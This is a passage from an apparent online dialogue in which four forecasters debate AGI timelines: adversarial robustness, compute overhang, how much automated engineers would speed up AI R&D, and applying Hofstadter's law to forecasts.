2023 18:39:50 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 18:39:50 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><blockquote><p> re: adversarial robustness: Same question I guess. My hot take would be (a) it&#39;s not actually that important, the way forward is not to never make errors in the first place but rather to notice and recover from them enough that the overall massive parallel society of LLM agents moves forward and makes progress, and (b) adversarial robustness is indeed improving. I&#39;d be curious to hear more, perhaps you have data on how fast it is improving and you extrapolate the trend and think it&#39;ll still be sucky by eg 2030?</p></blockquote><p> I&#39;ll give a less lengthy reply here, since structurally it&#39;s very similar to in-context learning, and has the same &quot;agree-qualitatively-but-not-quantitatively&quot; flavor. (For example, I definitely agree that the game is going to be coping with errors and error-correction, not never making errors; we&#39;re talking about whether that will take four years or more than four years.)</p><p> &quot;Not behaving erratically / falling over on super weird or adversarial inputs&quot; is a higher-level-of-abstraction cognitive skill humans are way better at than LLMs. LLMs are improving at this skill with scale (like all skills), and there are ways to address it with schlep and workflow rearrangements (like all problems), and it&#39;s unclear how important it is in the first place. But it&#39;s plausibly fairly important, and it seems like their current level is &quot;not amazing,&quot; and the trend is super unclear but not obviously going to make it in four years.</p><p> In general, when you&#39;re talking about &quot;Will it be four years from now or more than four years from now?&quot;, uncertainty and FUD on any point (in-context-learning, adversarial robustness, market-efficiency-and-schlep) pushes you toward &quot;more than four years from now&quot; — there&#39;s little room for it to push in the other direction. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="5y2XiEs9AKBnnpSx7-Sat, 04 Nov 2023 18:42:42 GMT" user-id="5y2XiEs9AKBnnpSx7" display-name="Ege Erdil" submitted-date="Sat, 04 Nov 2023 18:42:42 GMT" user-order="4"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ege Erdil</b></section><div><blockquote><p> In general, when you&#39;re talking about &quot;Will it be four years from now or more than four years from now?&quot;, uncertainty and FUD on any point (in-context-learning, adversarial robustness, pushes you toward &quot;more than four years from now&quot;</p></blockquote><p> I&#39;m curious why Ajeya thinks this claim is true for &quot;four years&quot; but not true for &quot;twenty years&quot; (assuming that&#39;s an accurate representation of her position, which I&#39;m not too confident about). </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 18:45:27 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 18:45:27 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><blockquote><p> I&#39;m curious why Ajeya thinks this claim is true for &quot;four years&quot; but not true for &quot;twenty years&quot; (assuming that&#39;s an accurate representation of her position, which I&#39;m not too confident about).</p></blockquote><p> I don&#39;t think it&#39;s insane to believe this to be true of 20 years, but I think we have many more examples of big, difficult, society-wide things happening over 20 years than over 4. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="YLFQfGzNdGA4NFcKS-Sat, 04 Nov 2023 18:45:40 GMT" user-id="YLFQfGzNdGA4NFcKS" display-name="Daniel Kokotajlo" submitted-date="Sat, 04 Nov 2023 18:45:40 GMT" user-order="2"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Daniel Kokotajlo</b></section><div><p> Quick comment re: in-context learning and/or low-data learning: It seems to me that GPT-4 is already pretty good at coding, and a big part of accelerating AI R&amp;D seems very much in reach -- like, it doesn&#39;t seem to me like there is a 10-year, 4-OOM-training-FLOP gap between GPT4 and a system which is basically a remote-working OpenAI engineer that thinks at 10x serial speed. Even if the research scientists are still human, this would speed things up a lot I think. So while I find the abstract arguments about how LLMs are worse at in-context learning etc. than humans plausible, when I think concretely about AI R&amp;D acceleration it still seems like it&#39;s gonna start happening pretty soon, and that makes me also update against the abstract argument a bit. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="XtphY3uYHwruKqDyG-Sat, 04 Nov 2023 18:46:41 GMT" user-id="XtphY3uYHwruKqDyG" display-name="habryka" submitted-date="Sat, 04 Nov 2023 18:46:41 GMT" user-order="1"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>habryka</b></section><div><p> So, I kind of want to check an assumption. On a compute-focused worldview, I feel a bit confused about how having additional AI engineers helps that much. Like, maybe this is a bit of a strawman, but my vibe is that there hasn&#39;t really been much architectural innovation or algorithmic progress in the last few years, and the dominant speedup has come from pouring more compute into existing architectures (with some changes to deal with the scale, but not huge ones).</p><p> Daniel, could you be more concrete about how a 10x AI engineer actually helps develop AGI? My guess is on a 4-year timescale you don&#39;t expect it to route through semiconductor supply chain improvements.</p><p> And then I want to check what Ajeya thinks here and whether something in this space might be a bit of a crux. My model of Ajeya does indeed think that AI systems in the next few years will be impressive, but not really actually that useful for making AI R&amp;D go better, or at least not like orders of magnitude better. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="5y2XiEs9AKBnnpSx7-Sat, 04 Nov 2023 18:48:18 GMT" user-id="5y2XiEs9AKBnnpSx7" display-name="Ege Erdil" submitted-date="Sat, 04 Nov 2023 18:48:18 GMT" user-order="4"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ege Erdil</b></section><div><blockquote><p> Like, maybe this is a bit of a strawman, but my vibe is that there hasn&#39;t really been much architectural innovation or algorithmic progress in the last few years, and the dominant speedup has come from pouring more compute into existing architectures (with some changes to deal with the scale, but not huge ones).</p></blockquote><p> My best guess is that algorithmic progress has probably continued at a rate of around a doubling of effective compute per year, at least insofar as you buy that one-dimensional model of algorithmic progress. Again, model uncertainty is a significant part of my overall view about this, but I think it&#39;s not accurate to say there hasn&#39;t been much algorithmic progress in the last few years. It&#39;s just significantly slower than the pace at which we&#39;re scaling up compute so it looks relatively less impressive.</p><p> <i>(Daniel, Ajeya +1 this comment)</i> </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="XtphY3uYHwruKqDyG-Sat, 04 Nov 2023 18:46:41 GMT" user-id="XtphY3uYHwruKqDyG" display-name="habryka" submitted-date="Sat, 04 Nov 2023 18:46:41 GMT" user-order="1"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>habryka</b></section><div><p> I was modeling one doubling a year as approximately not very much, compared to all the other dynamics involved, though of course it matters a bunch over the long run. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="YLFQfGzNdGA4NFcKS-Sat, 04 Nov 2023 18:56:42 GMT" user-id="YLFQfGzNdGA4NFcKS" display-name="Daniel Kokotajlo" submitted-date="Sat, 04 Nov 2023 18:56:42 GMT" user-order="2"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Daniel Kokotajlo</b></section><div><p> Re: Habryka&#39;s excellent point about how maybe engineering isn&#39;t the bottleneck, maybe compute is instead:<br><br> My impression is that roughly half the progress has come from increased compute and the other half from better algorithms. Going forward when I think concretely about the various limitations of current algorithms and pathways to overcome them -- which I am hesitant to go into detail about -- it sure does seem like there are still plenty of low and medium-hanging fruit to pick, and then high-hanging fruit beyond which would take decades for human scientists to get to but which can perhaps be reached much faster during an AI takeoff.<br><br> I am on a capabilities team at OpenAI right now and I think that we could be going something like 10x faster if we had the remote engineer thing I mentioned earlier. And I think this would probably apply across most of OpenAI research. This wouldn&#39;t accelerate our compute acquisition much at all to be clear, but that won&#39;t stop a software singularity from happening. Davidson model backs this up I think -- I&#39;d guess that if you magically change it to keep hardware &amp; compute progress constant, you still get a rapid R&amp;D acceleration, just a somewhat slower one.<br><br> I&#39;d think differently if I thought that parameter count was just Too Damn Low, like I used to think. If I was more excited about the human brain size comparison, I might think that nothing short of 100T parameters (trained according to Chinchilla also) could be AGI, and therefore that even if we had a remote engineer thinking at 10x speed we&#39;d just eat up the low-hanging fruit and then stall while we waited for bigger computers to come online. But I don&#39;t think that. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 18:56:54 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 18:56:54 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><blockquote><p> On a compute-focused worldview, I feel a bit confused about how having additional AI engineers helps that much. Like, maybe this is a bit of a strawman, but my vibe is that there hasn&#39;t really been much architectural innovation or algorithmic progress in the last few years, and the dominant speedup has come from pouring more compute into existing architectures (with some changes to deal with the scale, but not huge ones).</p></blockquote><p> I think there haven&#39;t been flashy paradigm-shifting insights, but I strongly suspect each half-GPT was a hard-won effort on a lot of fronts, including both a lot of mundane architecture improvements (like implementing long contexts in less naive ways that don&#39;t incur quadratic cost), a lot of engineering to do the model parallelism and other BS that is required to train bigger models without taking huge GPU utilization hits, and a lot of post-training improvements to make usable nice products. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="XtphY3uYHwruKqDyG-Sat, 04 Nov 2023 18:58:49 GMT" user-id="XtphY3uYHwruKqDyG" display-name="habryka" submitted-date="Sat, 04 Nov 2023 18:58:49 GMT" user-order="1"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>habryka</b></section><div><p> Ajeya: What you say seems right, but also the things you say also don&#39;t sound like the kind of thing that when you accelerate then 10x, then you get AGI 10x earlier. As you said, a lot of BS required to train large models, a lot of productization, but that doesn&#39;t speed up the semiconductor supply chain.</p><p> The context length and GPU utilization thing feels most relevant. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 18:59:49 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 18:59:49 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><blockquote><p> Ajeya: What you say seems right, but also the things you say also don&#39;t sound like the kind of thing that when you accelerate then 10x, then you get AGI 10x earlier. As you said, a lot of BS required to train large models, a lot of productization, but that doesn&#39;t speed up the semiconductor supply chain.</p></blockquote><p> Yeah, TBC, I think there&#39;s a higher bar than Daniel thinks there is to speeding stuff up 10x for reasons like this. I do think that there&#39;s algorithm juice, like Daniel says, but I don&#39;t think that a system you look at and naively think &quot;wow this is basically doing OAI ML engineer-like things&quot; will actually lead to a full 10x speedup; 10x is a lot.</p><p> I think you will eventually get the 10x, and then the 100x, but I&#39;m picturing that happening after some ramp-up where the first ML-engineer-like systems get integrated into workflows, improve themselves, change workflows to make better use of themselves, etc. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 18:53:49 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 18:53:49 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><blockquote><p> Quick comment re: in-context learning and/or low-data learning: It seems to me that GPT-4 is already pretty good at coding, and a big part of accelerating AI R&amp;D seems very much in reach.</p></blockquote><p> Agree this is the strongest candidate for crazy impacts soon, which is why my two updates of &quot;maybe meta-learning isn&#39;t that important and therefore long horizon training isn&#39;t as plausibly necessary&quot; and &quot;maybe I should just be obsessed with forecasting when we have the ML-research-engineer-replacing system because after that point progress is very fast&quot; are heavily entangled. <i><u>(Daniel reacts &quot;+1&quot; to this)</u></i></p><blockquote><p> -- like, it doesn&#39;t seem to me like there is a 10-year, 4-OOM-training-FLOP gap between GPT4 and a system which is basically a remote OpenAI engineer that thinks at 10x serial speed</p></blockquote><p> I don&#39;t know, 4 OOM is less than two GPTs, so we&#39;re talking less than GPT-6. Given how consistently I&#39;ve been wrong about how well &quot;impressive capabilities in the lab&quot; will translate to &quot;high economic value&quot; since 2020, this seems roughly right to me? </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="YLFQfGzNdGA4NFcKS-Sat, 04 Nov 2023 19:02:59 GMT" user-id="YLFQfGzNdGA4NFcKS" display-name="Daniel Kokotajlo" submitted-date="Sat, 04 Nov 2023 19:02:59 GMT" user-order="2"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Daniel Kokotajlo</b></section><div><blockquote><p> I don&#39;t know, 4 OOM is less than two GPTs, so we&#39;re talking less than GPT-6. Given how consistently I&#39;ve been wrong about how well &quot;impressive capabilities in the lab&quot; will translate to &quot;high economic value&quot; since 2020, this seems roughly right to me?</p></blockquote><p> I disagree with this update -- I think the update should be &quot;it takes a lot of schlep and time for the kinks to be worked out and for products to find market fit&quot; rather than &quot;the systems aren&#39;t actually capable of this.&quot; Like, I bet if AI progress stopped now, but people continued to make apps and widgets using fine-tunes of various GPTs, there would be OOMs more economic value being produced by AI in 2030 than today.<br><br> And so I think that the AI labs will be using AI remote engineers much sooner than the general economy will be. (Part of my view here is that around the time it is capable of being a remote engineer, the process of working out the kinks / pushing through schlep will itself be largely automatable.) </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="5y2XiEs9AKBnnpSx7-Sat, 04 Nov 2023 19:05:18 GMT" user-id="5y2XiEs9AKBnnpSx7" display-name="Ege Erdil" submitted-date="Sat, 04 Nov 2023 19:05:18 GMT" user-order="4"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ege Erdil</b></section><div><blockquote><p> Like, I bet if AI progress stopped now, but people continued to make apps and widgets using fine-tunes of various GPTs, there would be OOMs more economic value being produced by AI in 2030 than today.</p></blockquote><p><br> I&#39;m skeptical we would get 2 OOMs or more with just the current capabilities of AI systems, but I think even if you accept that, scaling from $1B/yr to $100B/yr is easier than from $100B/yr to $10T/yr. Accelerating AI R&amp;D by 2x seems more like the second change to me, or even bigger than that. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 19:06:10 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 19:06:10 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><blockquote><p> And so I think that the AI labs will be using AI remote engineers much sooner than the general economy will be. (Part of my view here is that around the time it is capable of being a remote engineer, the process of working out the kinks / pushing through schlep will itself be largely automatable.)</p></blockquote><p> I agree with this </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="YLFQfGzNdGA4NFcKS-Sat, 04 Nov 2023 19:10:51 GMT" user-id="YLFQfGzNdGA4NFcKS" display-name="Daniel Kokotajlo" submitted-date="Sat, 04 Nov 2023 19:10:51 GMT" user-order="2"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Daniel Kokotajlo</b></section><div><p> Yeah idk I pulled that out of my ass, maybe ​2 OOM is more like the upper limit given how much value there already is. I agree that going from X to 10X is easier than going from 10X to 100X, in general. I don&#39;t think that undermines my point though. I disagree with your claim that making AI progress go 2x faster is more like scaling from $100B to $10T-- I think it depends on when it happens! Right now in our state of massive overhang and low-hanging-fruit everywhere, making AI progress go 2x faster is easy.<br><br> Also to clarify when I said 10x faster I meant 10x faster algorithmic progress; compute progress won&#39;t accelerate by 10x obviously. But what this means is that I think we&#39;ll transition from a world where half or more of the progress is coming from scaling compute, to a world where most of the progress is coming from algorithmic improvements / pushing-through-schlep.</p></div></section><h2> Do we expect transformative AI pre-overhang or post-overhang? </h2><section class="dialogue-message ContentStyles-debateResponseBody" message-id="XtphY3uYHwruKqDyG-Sat, 04 Nov 2023 19:01:40 GMT" user-id="XtphY3uYHwruKqDyG" display-name="habryka" submitted-date="Sat, 04 Nov 2023 19:01:40 GMT" user-order="1"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>habryka</b></section><div><p> I think a hypothesis I have for a possible crux for a lot of the disagreement between Daniel and Ajeya is something like &quot;will we reach AGI before the compute overhang is over vs. after?&quot;.</p><p> Like, in as much as we think we are in a compute-overhang situation, there is an extremization that applies to people&#39;s timelines where if you we&#39;ll get there using just remaining capital and compute, you expect quite short timelines, but if you expect it will require faster chips or substantial algorithmic improvements, you expect longer, and with less probability-mass in-between.</p><p> Curious about Daniel and Ajeya answering the question of &quot;what probability do you assign to AGI before we exhausted the current compute overhang vs. after?&quot; </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 19:05:48 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 19:05:48 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><blockquote><p> &quot;what probability do you assign to AGI before we exhausted the current compute overhang vs. after?&quot;</p></blockquote><p> I think there are different extremities of compute overhang. The most extreme one which will be exhausted most quickly is like &quot;previously these companies were training AI systems on what is essentially chump change, and now we&#39;re starting to get into a world where it&#39;s real money, and soon it will be really real money.&quot; I think within 3-4 years we&#39;ll be talking tens of billions for a training run; I think the probability we get drop-in replacements for 99% remotable jobs (regardless of whether we&#39;ve rolled those drop-in replacements out everywhere) by then is something like...25%?</p><p> And then after that progress is still pretty compute-centric, but it moves slower because you&#39;re spending very real amounts of money, and you&#39;re impacting the entire supply chain: you need to build more datacenters which come with new engineering challenges, more chip-printing facilities, more fabs, more fab equipment manufacturing plans, etc. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="YLFQfGzNdGA4NFcKS-Sat, 04 Nov 2023 19:10:51 GMT" user-id="YLFQfGzNdGA4NFcKS" display-name="Daniel Kokotajlo" submitted-date="Sat, 04 Nov 2023 19:10:51 GMT" user-order="2"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Daniel Kokotajlo</b></section><div><p> re: Habryka: Yes we disagree about whether the current overhang is enough. But the cruxes for this are the things we are already discussing. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="XtphY3uYHwruKqDyG-Sat, 04 Nov 2023 19:08:57 GMT" user-id="XtphY3uYHwruKqDyG" display-name="habryka" submitted-date="Sat, 04 Nov 2023 19:08:57 GMT" user-order="1"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>habryka</b></section><div><blockquote><p> re: Habryka: Yes we disagree about whether the current overhang is enough. But the cruxes for this are the things we are already discussing.</p></blockquote><p> Cool, that makes sense. That does seem like it might exaggerate the perceived disagreements between the two of you, when you just look at the graphs, though it&#39;s of course still highly decision-relevant to dig deeper into whether this is true or not.</p></div></section><h2> Hofstadter&#39;s law in AGI forecasting </h2><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 19:06:47 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 19:06:47 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><p> TBC Daniel, I think we differ by a factor of 2 on the probability for your median scenario. I feel like a general structure of our disagreements have been like: you (Daniel) are saying a scenario that makes sense and which I place a lot of weight on, but it seems like there are other scenarios and it seems like your whole timetable leaves little room for Hofstadter&#39;s law. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="5y2XiEs9AKBnnpSx7-Sat, 04 Nov 2023 19:13:44 GMT" user-id="5y2XiEs9AKBnnpSx7" display-name="Ege Erdil" submitted-date="Sat, 04 Nov 2023 19:13:44 GMT" user-order="4"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ege Erdil</b></section><div><blockquote><p> I feel like a general structure of our disagreements have been like: you (Daniel) are saying a scenario that makes sense and which I place a lot of weight on, but it seems like there are other scenarios and it seems like your whole timetable leaves little room for Hofstadter&#39;s law.</p></blockquote><p> I think this also applies to the disagreement between me and Ajeya. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="YLFQfGzNdGA4NFcKS-Sat, 04 Nov 2023 19:16:52 GMT" user-id="YLFQfGzNdGA4NFcKS" display-name="Daniel Kokotajlo" submitted-date="Sat, 04 Nov 2023 19:16:52 GMT" user-order="2"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Daniel Kokotajlo</b></section><div><p> A thing that would change my mind is if I found other scenarios more plausible. Wanna sketch some?<br><br> Regarding Hofstadter&#39;s law: A possible crux between us is that you both seem to think it applies on timescales of decades -- a multiplicative factor on timelines -- whereas I think it&#39;s more like &quot;add three years.&quot;正确的？ </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="5y2XiEs9AKBnnpSx7-Sat, 04 Nov 2023 19:17:53 GMT" user-id="5y2XiEs9AKBnnpSx7" display-name="Ege Erdil" submitted-date="Sat, 04 Nov 2023 19:17:53 GMT" user-order="4"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ege Erdil</b></section><div><blockquote><p> Re: Hofstadter&#39;s law: A possible crux between us is that you both seem to think it applies on timescales of decades -- a multiplicative factor on timelines -- whereas I think it&#39;s more like &quot;add three years.&quot;正确的？</p></blockquote><p> Yes, in general, that&#39;s how I would update my timelines about anything to be longer, not just AGI. The additive method seems pretty bad to me unless you have some strong domain-specific reason to think you should be making an additive update. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="YLFQfGzNdGA4NFcKS-Sat, 04 Nov 2023 19:26:13 GMT" user-id="YLFQfGzNdGA4NFcKS" display-name="Daniel Kokotajlo" submitted-date="Sat, 04 Nov 2023 19:26:13 GMT" user-order="2"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Daniel Kokotajlo</b></section><div><blockquote><p> Yes, in general, that&#39;s how I would update my timelines about anything to be longer, not just AGI. The additive method seems pretty bad to me unless you have some strong domain-specific reason to think you should be making an additive update.</p></blockquote><p> Excellent. So my reason for doing the additive method is that I think Hofstadter&#39;s law / schlep / etc. is basically the planning fallacy, and it applies when your forecast is based primarily on imagining a series of steps being implemented. It does NOT apply when your forecast is based primarily on extrapolating trends. Like, you wouldn&#39;t look at a graph of exponential progress in Moore&#39;s law or solar power or whatever and then be like &quot;but to account for Hofstadter&#39;s Law I will assume things take twice as long as I expect, therefore instead of extrapolating the trend-line straight I will cut its slope by half.&quot;<br><br> And when it comes to AGI timelines, I think that the shorter-timeline scenarios look more subject to the planning fallacy, whereas the longer-timeline scenarios look more like extrapolating trends.<br><br> So in a sense I&#39;m doing the multiplicative method, but only on the shorter worlds. Like, when I say 2027 as my median, that&#39;s kinda because I can actually quite easily see it happening in 2025, but things take longer than I expect, so I double it... I&#39;m open to being convinced that I&#39;m not taking this into account enough and should shift my timelines back a few years more; however I find it very implausible that I should add eg 15 years to my median because of this.</p></div></section><h2> Summary of where we are at so far and exploring additional directions </h2><section class="dialogue-message ContentStyles-debateResponseBody" message-id="XtphY3uYHwruKqDyG-Sat, 04 Nov 2023 19:21:07 GMT" user-id="XtphY3uYHwruKqDyG" display-name="habryka" submitted-date="Sat, 04 Nov 2023 19:21:07 GMT" user-order="1"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>habryka</b></section><div><p> We&#39;ve been going for a while and it might make sense to take a short step back. Let me try to summarize where we are at:</p><p> We&#39;ve been mostly focusing on the disagreement between Ajeya and Daniel. It seems like one core theme in the discussion has been the degree to which &quot;reality has a lot of detail and kinks need to be figured out before AI systems are actually useful&quot;. Ajeya currently thinks that while it is true that AGI companies will have access to these tools earlier, there still will be a lot of stuff to figure out before you actually have a system equivalent to a current OAI engineer. Daniel made a similar update in noticing a larger-than-he-expected delay in the transition from &quot;having all the stuff necessary to make a more capably system, like architecture, compute, training setup&quot; and &quot;actually producing a more capable system&quot;.</p><p> However, it&#39;s also not clear how much this actually explains the differences in the timelines for the two of you.</p><p> We briefly touched on compute overhangs being a thing that&#39;s very relevant to both of your distributions, in that Daniel assigns substantially higher probability to a very high R&amp;D speed-up before the current overhang is exhausted, which pushes his probability mass a bunch earlier. And correspondingly Ajeya&#39;s timelines are pretty sensitive to relatively small changes in compute requirements on the margin, since that would push a bunch of probability mass into the pre-overhang world. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 19:21:30 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 19:21:30 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><p> I&#39;ll put in a meta note here that I think it&#39;s pretty challenging to argue about a 25% vs a 50% on the Daniel scenario, that is literally one bit of evidence one of us sees that the other doesn&#39;t. It seems like Daniel thinks I need stronger arguments/evidence than I have to be at 25% instead of 50%, but it&#39;s easy to find one bit somewhere and hard to argue about whether it really is one bit.</p></div></section><h2> Exploring conversational directions </h2><section class="dialogue-message ContentStyles-debateResponseBody" message-id="YLFQfGzNdGA4NFcKS-Sat, 04 Nov 2023 19:34:05 GMT" user-id="YLFQfGzNdGA4NFcKS" display-name="Daniel Kokotajlo" submitted-date="Sat, 04 Nov 2023 19:34:05 GMT" user-order="2"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Daniel Kokotajlo</b></section><div><p> In case interested, here are some possible conversation topics/starters:<br><br> (1) I could give a scenario in which AGI happens by some very soon date, eg December 2024 or 2026, and then we could talk about what parts of the scenario are most unlikely (~= what parts would cause the biggest updates to us if we observed them happening)<br><br> (2) Someone without secrecy concerns (ie someone not working at OpenAI, ie Ajeya or Ege or Habryka) could sketch what they think they would aim to have built by 2030 if they were in charge of a major AI lab and were gunning for AGI asap. Parameter count, training FLOP, etc. taken from standard projections, but then more details like what the training process and data would look like etc. Then we could argue about what this system would be capable of and what it would be incapable of, eg how fast would it speed up AI R&amp;D compared to today.<br><br> (2.5) As above except for convenience we use Steinhardt&#39;s <a href="https://www.lesswrong.com/posts/WZXqNYbJhtidjRXSi/what-will-gpt-2030-look-like">What will GPT-2030 look like?</a> and factor the discussion into (a) will GPT-2030 be capable of the things he claims it will be capable of, and (b) will that cause a rapid acceleration of AI R&amp;D leading shortly to AGI?<br><br> (3) Ege or Ajeya could sketch a scenario in which the year 2035 comes and goes without AGI, despite there being no AI progress slowdown (no ban, no heavy regulation, no disruptive war, etc.). Then I could say why I think such a scenario is implausible, and we could discuss more generally what that world looks like. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 19:25:32 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 19:25:32 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><blockquote><p> On Daniel&#39;s four topics:<br><br> (1) I could give a scenario in which AGI happens by some very soon date, eg December 2024 or 2026, and then we could talk about what parts of the scenario are most unlikely (~= what parts would cause the biggest updates to us if we observed them happening)</p></blockquote><p> I suspect I&#39;ll be like &quot;Yep, seems plausible, and my probability on it coming to pass is 2-5x smaller.&quot;</p><blockquote><p> (2) Someone without secrecy concerns (ie someone not working at OpenAI, ie Ajeya or Ege or Habryka) could sketch what they think they would aim to have built by 2030 if they were in charge of a major AI lab and were gunning for AGI asap. Parameter count, training FLOP, etc. taken from standard projections, but then more details like what the training process and data would look like etc. Then we could argue about what this system would be capable of and what it would be incapable of, eg how fast would it speed up AI R&amp;D compared to today.</p></blockquote><p> I could do this if people thought it would be useful.</p><blockquote><p> (2.5) As above except for convenience we use Steinhardt&#39;s <a href="https://www.lesswrong.com/posts/WZXqNYbJhtidjRXSi/what-will-gpt-2030-look-like">What will GPT-2030 look like?</a> and factor the discussion into (a) will GPT-2030 be capable of the things he claims it will be capable of, and (b) will that cause a rapid acceleration of AI R&amp;D leading shortly to AGI?</p></blockquote><p> I like this blog post but I feel like it&#39;s quite tame compared to what both Daniel and I think is plausible so not sure if it&#39;s the best thing to anchor on.</p><blockquote><p> (3) Ege or Ajeya could sketch a scenario in which the year 2035 comes and goes without AGI, despite there being no AI progress slowdown (no ban, no heavy regulation, no disruptive war, etc.). Then I could say why I think such a scenario is implausible, and we could discuss more generally what that world looks like.</p></blockquote><p> I can do this if people thought it would be useful.</p></div></section><h2> Ege&#39;s median world </h2><section class="dialogue-message ContentStyles-debateResponseBody" message-id="5y2XiEs9AKBnnpSx7-Sat, 04 Nov 2023 19:25:39 GMT" user-id="5y2XiEs9AKBnnpSx7" display-name="Ege Erdil" submitted-date="Sat, 04 Nov 2023 19:25:39 GMT" user-order="4"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ege Erdil</b></section><div><p> My median world looks something like this: we keep scaling compute until we hit training runs at a size of 1e28 to 1e30 FLOP in maybe 5 to 10 years, and after that scaling becomes increasingly difficult because of us running up against supply constraints. Software progress continues but slows down along with compute scaling. However, the overall economic impact of AI continues to grow: we have individual AI labs in 10 years that might be doing on the order of eg $30B/yr in revenue.<br><br> We also get more impressive capabilities: maybe AI systems can get gold on the IMO in five years, we get more reliable image generation, GPT-N can handle more complicated kinds of coding tasks without making mistakes, stuff like that. So in 10 years AI systems are just pretty valuable economically, but I expect the AI industry to look more like today&#39;s tech industry - valuable but not economically transformative.<br><br> This is mostly because I don&#39;t expect just putting 1e30 FLOP of training compute into a system will be enough to 